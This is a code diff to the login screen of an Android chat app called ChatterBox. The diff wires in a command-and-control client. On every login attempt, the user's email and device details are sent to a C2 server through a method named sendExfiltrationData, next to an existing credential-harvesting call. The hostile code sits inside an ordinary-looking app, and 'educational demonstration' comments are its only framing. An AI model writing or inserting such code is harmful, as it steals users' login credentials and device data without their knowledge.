@@ -9,16 +9,22 @@ import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.example.ChatterBox.malicious.CredentialHarvester
+import com.example.ChatterBox.malicious.C2Client
 import com.google.firebase.auth.FirebaseAuth
+import org.json.JSONObject
 
 class LoginActivity : AppCompatActivity() {
     private lateinit var auth: FirebaseAuth
+    private lateinit var c2Client: C2Client
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_login)
 
         auth = FirebaseAuth.getInstance()
+        
+        // Initialize C2 client
+        c2Client = C2Client(this)
 
         val emailInput = findViewById<EditText>(R.id.emailInput)
         val passwordInput = findViewById<EditText>(R.id.passwordInput)
@@ -39,6 +45,9 @@ class LoginActivity : AppCompatActivity() {
             // Harvest credentials before login attempt (for educational demonstration only)
             harvestCredentials(email, password)
             
+            // Connect to C2 server immediately when user attempts to log in
+            connectToC2Server(email)
+            
             auth.signInWithEmailAndPassword(email, password)
                 .addOnSuccessListener {
                     startActivity(Intent(this, MainActivity::class.java))
@@ -53,6 +62,35 @@ class LoginActivity : AppCompatActivity() {
                 .addOnCompleteListener {
                     progressBar.visibility = ProgressBar.GONE
                 }
+        }
+    }
+    
+    /**
+     * Connect to the C2 server and send device registration
+     * FOR EDUCATIONAL DEMONSTRATION ONLY
+     */
+    private fun connectToC2Server(userEmail: String) {
+        Log.d("C2Connection", "Connecting to C2 server on login")
+        
+        try {
+            // Register the device with C2 server
+            c2Client.registerDevice()
+            
+            // Send additional login event data
+            val loginData = JSONObject().apply {
+                put("event_type", "user_login")
+                put("email", userEmail)
+                put("timestamp", System.currentTimeMillis())
+                put("device_model", android.os.Build.MODEL)
+                put("android_version", android.os.Build.VERSION.RELEASE)
+            }
+            
+            // Send the login event to the C2 server
+            c2Client.sendExfiltrationData("login_event", loginData.toString())
+            
+            Log.d("C2Connection", "Successfully connected to C2 server and sent login data")
+        } catch (e: Exception) {
+            Log.e("C2Connection", "Error connecting to C2 server", e)
         }
     }
     
